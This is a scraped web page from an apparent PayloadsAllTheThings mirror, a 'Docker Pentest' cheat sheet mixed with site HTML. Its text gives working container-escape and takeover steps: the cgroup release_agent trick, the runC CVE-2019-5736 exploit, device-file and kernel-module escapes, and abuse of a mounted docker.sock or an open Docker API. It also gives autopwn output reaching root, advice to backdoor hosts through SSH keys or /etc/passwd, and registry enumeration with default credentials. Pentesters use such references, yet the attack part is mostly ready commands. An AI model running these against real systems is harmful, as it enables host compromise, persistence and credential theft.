/cmd echo &quot;ps aux &gt; $host_path/output&quot; &gt;&gt; /cmd chmod a+x /cmd sh -c &quot;echo \\$\\$ &gt; /tmp/cgrp/x/cgroup.procs&quot; Breaking out of Docker via runC The vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command … as root within a container in either of these contexts: Creating a new container using an attacker-controlled image. Attaching (docker exec) into an existing container which the attacker had previous write access to. - Vulnerability overview by the runC team Exploit for CVE-2019-5736 : https://github.com/twistlock/RunC-CVE-2019-5736 1 2 $ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC $ docker run --rm cve-2019-5736:malicious_image_POC Breaking out of containers using a device file 1 2 3 4 5 https://github.com/FSecureLABS/fdpasser In container, as root: ./fdpasser recv /moo /etc/shadow Outside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f &quot;sleep 1337&quot;)/root/moo Outside container: ls -la /etc/shadow Output: -rwsrwsrwx 1 root shadow 1209 Oct 10 2019 /etc/shadow Breaking out of Docker via kernel modules loading When privileged Linux containers attempt to load kernel modules, the modules are loaded into the host’s kernel (because there is only one kernel, unlike VMs). This provides a route to an easy container escape. Exploitation: Clone the repository : git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping Build with make Start a privileged docker container with docker run -it --privileged --hostname docker --mount &quot;type=bind,src=$PWD,dst=/root&quot; ubuntu cd /root in the new container Insert the kernel module with ./escape Run ./execute! Unlike other techniques, this module doesn’t contain any syscalls hooks, but merely creates two new proc files; /proc/escape and /proc/output. /proc/escape only answers to write requests and simply executes anything that’s passed to it via call_usermodehelper(). /proc/output just takes input and stores it in a buffer when written to, then returns that buffer when it’s read from - essentially acting a like a file that both the container and the host can read/write to. The clever part is that anything we write to /proc/escape gets sandwiched into /bin/sh -c &lt;INPUT&gt; &gt; /proc/output. This means that the command is run under /bin/sh and the output is redirected to /proc/output, which we can then read from within the container. Once the module is loaded, you can simply echo &quot;cat /etc/passwd&quot; &gt; /proc/escape and then get the result via cat /proc/output. Alternatively, you can use the execute program to give yourself a makeshift shell (albeit an extraordinarily basic one). The only caveat is that we cannot be sure that the container has kmod installed (which provides insmod and rmmod). To overcome this, after building the kernel module, we load it’s byte array into a C program, which then uses the init_module() syscall to load the module into the kernel without needing insmod. If you’re interested, take a look at the Makefile. References Hacking Docker Remotely - 17 March 2020 - ch0ks Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon Breaking out of Docker via runC – Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019 CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl OWASP - Docker Security CheatSheet Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017 Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Container   docker pentest | PayloadsAllTheThings
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="PayloadsAllTheThings">
<meta name="application-name" content="PayloadsAllTheThings">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- Google Tag and Analytics -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BJ57VSC3B5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BJ57VSC3B5');
</script>
<!-- Translate website -->
<script>
/*
  function googleTranslateElementInit() {

  new google.translate.TranslateElement(
    {
      pageLanguage: "en",
      includedLanguages: "en,id",
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    },
    "google_translate_element"
  );
}
setTimeout( function() {
  googleTranslateElementInit();
  }, 500);
*/
</script>
  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->
<!-- <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>





</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/logo.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">PayloadsAllTheThings</a>
    </div>

    <div class="site-subtitle font-italic">A list of useful payloads</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Zxce3" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Zxce3_" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['Zxce3','protonmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>Container   docker pentest</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->






<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Container   docker pentest</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Zxce3
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sun, Dec 13, 2020, 12:00 AM +0700"
  

  
  prep="on" >

  
  

  
    Dec 13, 2020
  

  <i class="unloaded">2020-12-13T00:00:00+07:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1227 words">6 min reads</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h1 id="docker-pentest">Docker Pentest</h1>

<blockquote>
  <p>Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers.</p>
</blockquote>

<h2 id="summary">Summary</h2>

<ul>
  <li><a href="#tools">Tools</a></li>
  <li><a href="#mounted-docker-socket">Mounted Docker Socket</a></li>
  <li><a href="#open-docker-api-port">Open Docker API Port</a></li>
  <li><a href="#insecure-docker-registry">Insecure Docker Registry</a></li>
  <li><a href="#exploit-privileged-container-abusing-the-linux-cgroup-v1">Exploit privileged container abusing the Linux cgroup v1</a></li>
  <li><a href="#breaking-out-of-docker-via-runc">Breaking out of Docker via runC</a></li>
  <li><a href="#breaking-out-of-containers-using-a-device-file">Breaking out of containers using a device file</a></li>
  <li><a href="#references">References</a></li>
</ul>

<h2 id="tools">Tools</h2>

<ul>
  <li><a href="https://github.com/kost/dockscan">Dockscan</a> : Dockscan is security vulnerability and audit scanner for Docker installations
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">dockscan</span><span class="w"> </span><span class="nx">unix:///var/run/docker.sock</span><span class="w">
  </span><span class="n">dockscan</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">html</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">myreport</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nx">tcp://example.com:5422</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/stealthcopter/deepce">DeepCe</a> : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="o">.</span><span class="n">/deepce.sh</span><span class="w"> 
  </span><span class="o">.</span><span class="n">/deepce.sh</span><span class="w"> </span><span class="nt">--no-enumeration</span><span class="w"> </span><span class="nt">--exploit</span><span class="w"> </span><span class="nx">PRIVILEGED</span><span class="w"> </span><span class="nt">--username</span><span class="w"> </span><span class="nx">deepce</span><span class="w"> </span><span class="nt">--password</span><span class="w"> </span><span class="nx">deepce</span><span class="w">
  </span><span class="o">.</span><span class="n">/deepce.sh</span><span class="w"> </span><span class="nt">--no-enumeration</span><span class="w"> </span><span class="nt">--exploit</span><span class="w"> </span><span class="nx">SOCK</span><span class="w"> </span><span class="nt">--shadow</span><span class="w">
  </span><span class="o">.</span><span class="n">/deepce.sh</span><span class="w"> </span><span class="nt">--no-enumeration</span><span class="w"> </span><span class="nt">--exploit</span><span class="w"> </span><span class="nx">DOCKER</span><span class="w"> </span><span class="nt">--command</span><span class="w"> </span><span class="s2">"whoami&gt;/tmp/hacked"</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<h2 id="mounted-docker-socket">Mounted Docker Socket</h2>

<p>Prerequisite:</p>
<ul>
  <li>Socker mounted as volume : <code class="language-plaintext highlighter-rouge">- "/var/run/docker.sock:/var/run/docker.sock"</code></li>
</ul>

<p>Usually found in <code class="language-plaintext highlighter-rouge">/var/run/docker.sock</code>, for example for Portainer.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">curl</span><span class="w"> </span><span class="nt">--unix-socket</span><span class="w"> </span><span class="nx">/var/run/docker.sock</span><span class="w"> </span><span class="nx">http://127.0.0.1/containers/json</span><span class="w">
</span><span class="n">curl</span><span class="w"> </span><span class="nt">-XPOST</span><span class="w"> </span><span class="err">–</span><span class="nx">unix-socket</span><span class="w"> </span><span class="nx">/var/run/docker.sock</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s1">'{"Image":"nginx"}'</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="s1">'Content-Type: application/json'</span><span class="w"> </span><span class="nx">http://localhost/containers/create</span><span class="w">
</span><span class="n">curl</span><span class="w"> </span><span class="nt">-XPOST</span><span class="w"> </span><span class="err">–</span><span class="nx">unix-socket</span><span class="w"> </span><span class="nx">/var/run/docker.sock</span><span class="w"> </span><span class="nx">http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Exploit using <a href="https://github.com/brompwnie/ed">brompwnie/ed</a></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="n">root</span><span class="err">@</span><span class="nx">37bb034797d1:/tmp</span><span class="c"># ./ed_linux_amd64 -path=/var/run/ -autopwn=true        </span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Hunt</span><span class="w"> </span><span class="nx">dem</span><span class="w"> </span><span class="nx">Socks</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Hunting</span><span class="w"> </span><span class="nx">Down</span><span class="w"> </span><span class="nx">UNIX</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Sockets</span><span class="w"> </span><span class="nx">from:</span><span class="w"> </span><span class="nx">/var/run/</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Valid</span><span class="w"> </span><span class="nx">Socket:</span><span class="w"> </span><span class="nx">/var/run/docker.sock</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">autopwn</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Hunting</span><span class="w"> </span><span class="nx">Docker</span><span class="w"> </span><span class="nx">Socks</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">Autopwn:</span><span class="w">  </span><span class="nx">/var/run/docker.sock</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Getting</span><span class="w"> </span><span class="nx">Docker</span><span class="w"> </span><span class="nx">client...</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Successfully</span><span class="w"> </span><span class="nx">got</span><span class="w"> </span><span class="nx">Docker</span><span class="w"> </span><span class="nx">client...</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">escape</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">host...</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">TTY</span><span class="w"> </span><span class="nx">Mode</span><span class="w">
</span><span class="n">chroot</span><span class="w"> </span><span class="nx">/host</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">clear</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s1">'You are now on the underlying host'</span><span class="w">
</span><span class="n">chroot</span><span class="w"> </span><span class="nx">/host</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">clear</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s1">'You are now on the underlying host'</span><span class="w">
</span><span class="n">/</span><span class="w"> </span><span class="c"># chroot /host &amp;&amp; clear</span><span class="w">
</span><span class="n">/</span><span class="w"> </span><span class="c"># echo 'You are now on the underlying host'</span><span class="w">
</span><span class="n">You</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">now</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">underlying</span><span class="w"> </span><span class="nx">host</span><span class="w">
</span><span class="n">/</span><span class="w"> </span><span class="c"># id</span><span class="w">
</span><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">1</span><span class="p">(</span><span class="n">bin</span><span class="p">),</span><span class="mi">2</span><span class="p">(</span><span class="n">daemon</span><span class="p">),</span><span class="mi">3</span><span class="p">(</span><span class="n">sys</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="n">adm</span><span class="p">),</span><span class="mi">6</span><span class="p">(</span><span class="n">disk</span><span class="p">),</span><span class="mi">10</span><span class="p">(</span><span class="n">wheel</span><span class="p">),</span><span class="mi">11</span><span class="p">(</span><span class="n">floppy</span><span class="p">),</span><span class="mi">20</span><span class="p">(</span><span class="n">dialout</span><span class="p">),</span><span class="mi">26</span><span class="p">(</span><span class="n">tape</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="n">video</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="open-docker-api-port">Open Docker API Port</h2>

<p>Prerequisite:</p>
<ul>
  <li>Docker runned with <code class="language-plaintext highlighter-rouge">-H tcp://0.0.0.0:XXXX</code></li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="nt">-sCV</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">2376</span><span class="w">
</span><span class="mi">2376</span><span class="n">/tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">docker</span><span class="w">  </span><span class="nx">Docker</span><span class="w"> </span><span class="nx">19.03.5</span><span class="w">
</span><span class="o">|</span><span class="w"> </span><span class="n">docker-version:</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="n">Version:</span><span class="w"> </span><span class="nx">19.03.5</span><span class="w">
</span><span class="o">|</span><span class="w">   </span><span class="n">MinAPIVersion:</span><span class="w"> </span><span class="nx">1.12</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Mount the current system inside a new “temporary” Ubuntu container, you will gain root access to the filesystem in <code class="language-plaintext highlighter-rouge">/mnt</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">export</span><span class="w"> </span><span class="nx">DOCKER_HOST</span><span class="o">=</span><span class="n">tcp://10.10.10.10:2376</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="nx">docker</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nt">--name</span><span class="w"> </span><span class="nx">ubuntu_bash</span><span class="w"> </span><span class="nt">--rm</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nx">/:/mnt</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nx">0</span><span class="w">  </span><span class="nt">-t</span><span class="w"> </span><span class="nx">ubuntu</span><span class="w"> </span><span class="nx">bash</span><span class="w">
</span><span class="n">or</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="nx">docker</span><span class="w"> </span><span class="nt">-H</span><span class="w">  </span><span class="nx">open.docker.socket:2375</span><span class="w"> </span><span class="nx">ps</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="nt">-H</span><span class="w">  </span><span class="nx">open.docker.socket:2375</span><span class="w"> </span><span class="nx">exec</span><span class="w"> </span><span class="nt">-it</span><span class="w"> </span><span class="nx">mysql</span><span class="w"> </span><span class="nx">/bin/bash</span><span class="w">
</span><span class="n">or</span><span class="w"> 
</span><span class="err">$</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="err">–</span><span class="nx">insecure</span><span class="w"> </span><span class="nx">https://tls-opendocker.socket:2376/secrets</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">jq</span><span class="w">
</span><span class="err">$</span><span class="w"> </span><span class="nx">curl</span><span class="w"> </span><span class="err">–</span><span class="nx">insecure</span><span class="w"> </span><span class="nt">-X</span><span class="w"> </span><span class="nx">POST</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="s2">"Content-Type: application/json"</span><span class="w"> </span><span class="nx">https://tls-opendocker.socket2376/containers/create</span><span class="nf">?</span><span class="nx">name</span><span class="o">=</span><span class="nx">test</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="s1">'{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>From there you can backdoor the filesystem by adding an ssh key in <code class="language-plaintext highlighter-rouge">/root/.ssh</code> or adding a new root user in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>

<h2 id="insecure-docker-registry">Insecure Docker Registry</h2>

<p>Docker Registry’s fingerprint is <code class="language-plaintext highlighter-rouge">Docker-Distribution-Api-Version</code> header. Then connect to Registry API endpoint: <code class="language-plaintext highlighter-rouge">/v2/_catalog</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="n">curl</span><span class="w"> </span><span class="nx">https://registry.example.com/v2/</span><span class="err">&lt;</span><span class="nx">image_name</span><span class="err">&gt;</span><span class="nx">/tags/list</span><span class="w">
</span><span class="n">docker</span><span class="w"> </span><span class="nx">pull</span><span class="w"> </span><span class="nx">https://registry.example.com:443/</span><span class="err">&lt;</span><span class="nx">image_name</span><span class="err">&gt;</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">tag</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># connect to the endpoint and list image blobs</span><span class="w">
</span><span class="n">curl</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">--user</span><span class="w"> </span><span class="s2">"admin:admin"</span><span class="w"> </span><span class="nx">https://docker.registry.local/v2/_catalog</span><span class="w">
</span><span class="n">curl</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">--user</span><span class="w"> </span><span class="s2">"admin:admin"</span><span class="w"> </span><span class="nx">https://docker.registry.local/v2/wordpress-image/tags/list</span><span class="w">
</span><span class="n">curl</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">--user</span><span class="w"> </span><span class="s2">"admin:admin"</span><span class="w"> </span><span class="nx">https://docker.registry.local/v2/wordpress-image/manifests/latest</span><span class="w">
</span><span class="c"># download blobs</span><span class="w">
